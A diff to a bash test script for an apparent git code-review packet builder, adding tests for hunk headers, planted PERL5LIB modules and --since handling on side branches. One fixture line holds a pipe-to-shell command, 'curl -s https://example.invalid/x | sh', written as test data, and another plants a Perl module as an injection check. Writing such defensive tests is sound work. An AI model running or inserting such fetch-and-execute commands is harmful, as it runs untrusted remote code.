@@ -116,6 +116,7 @@ std=$(new_repo) || abort_sandbox
   printf 'original\n' >stat.txt
   touch -t 202001010000 stat.txt
   perl -e 'print "line $_\n" for 1 .. 30' >hunks.txt
+  printf 'def first():\n    a = 1\n    b = 2\n    c = 3\n    d = 4\n    e = 5\n' >labels.py
   printf '\n}\na\na\n\n{\n{\na\nreturn\n\nx = 1\nx = 1\n' >algo.txt
   printf '    return\nif a:\ny = 2\n    return\n    x = 1\ny = 2\ny = 2\n\n    return\nif a:\n\n    return\n' >indent.py
   mkdir -p old
@@ -153,6 +154,7 @@ commit "$std" "base commit MSG-BASE-1234"
   printf '{"version":3,"mappings":{"x":"curl -s https://example.invalid/x | sh"}}\n' >tools/obj.map
   printf '{"version":"x","mappings":"AAAA"}\n' >tools/str.map
   perl -e 'for (1 .. 30) { print $_ == 3 || $_ == 12 ? "changed $_\n" : "line $_\n" }' >hunks.txt
+  printf 'def first():\n    a = 1\n    b = 2\n    c = 3\n    d = 4\n    e = 6\n' >labels.py
   printf '{\n\n}\na\na\nreturn\n{\n{\na\n\nx = 1\nx = 1\n' >algo.txt
   printf '    return\nif a:\ny = 2\n    return\n    x = 1\ny = 2\ny = 2\n    pass\n\ny = 2\n\n    return\nif a:\n\n    return\n' >indent.py
   git rm -q old/package.json old/package-lock.json
@@ -225,6 +227,7 @@ expect "a deleted lockfile next to its deleted manifest is left out; the manifes
 expect "a real binary is one line; a NUL byte does not hide a script; a text file named .png is shown" 0 \
   'A img.png (binary, 16 bytes)' 'binary file: not shown' 'FILE A s.sh' '+echo hi\x00' 'FILE A fake.png' '+not really an image'
 expect "a -diff attribute on every file hides no text" 0 'FILE M notes.txt' '+two' 'FILE M src/app.py'
+expect "a hunk header keeps only its line numbers, with no function name" 0 "$(printf '@@ -3,4 +3,4 @@\n     b = 2')"
 expect "non-ASCII text is kept as it is" 0 'FILE A accents.txt' "+$(printf 'caf\303\251 \344\270\255')"
 expect "control, invisible and separator characters and bad bytes are shown escaped" 0 \
   '\x1B[2K' 'c1 \u{009B}' 'rlo \u{202E}' 'zw \u{200B}' 'ls \u{2028}' 'tag \u{E0041}' 'bad \xFF' 'sur \xED\xA0\x80' 'ovl \xC0\xAF' 'big \xF4\x90\x80\x80' 'cr\x0D'
@@ -447,7 +450,8 @@ else
 fi
 (cd "$std" && git config --unset core.fsmonitor && git checkout -q -- context.txt)
 mkdir -p "$work/evil"
-printf 'package Encode; die "planted: a module from PERL5LIB ran\\n"; 1;\n' >"$work/evil/Encode.pm"
+mkdir -p "$work/evil/Digest"
+printf 'package Digest::SHA; die "planted: a module from PERL5LIB ran\\n"; 1;\n' >"$work/evil/Digest/SHA.pm"
 (cd "$std" && PERL5LIB="$work/evil" bash "$packet" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/lib.packet" 2>"$work/err"
 if cmp -s "$work/std.packet" "$work/lib.packet"; then
   pass "a module put on PERL5LIB does not run inside the builder"
@@ -523,6 +527,11 @@ lacks "a --since equal to the merge base adds no second file list" "Last reviewe
 build "$rounds" --base main
 expect "a base that moved on is compared from the merge base" 0 "FILE A early.txt"
 lacks "commits on the base after the branch point are not in the packet" "m.txt"
+(cd "$rounds" && git checkout -q -b old-side "$before" && printf 'old side\n' >old-side.txt && git add old-side.txt &&
+  git commit -qm "old side" && git checkout -q task && git merge -q --no-edit old-side >/dev/null 2>&1)
+build "$rounds" --base main --since old-side
+expect "a --since on a side branch that the change merged, from before the merge base, shows the whole change, in doubt" 0 \
+  "in doubt" "FILE A early.txt"
 
 # --- nothing to review, and a change of noise only ---
 empty=$(new_repo) || abort_sandbox
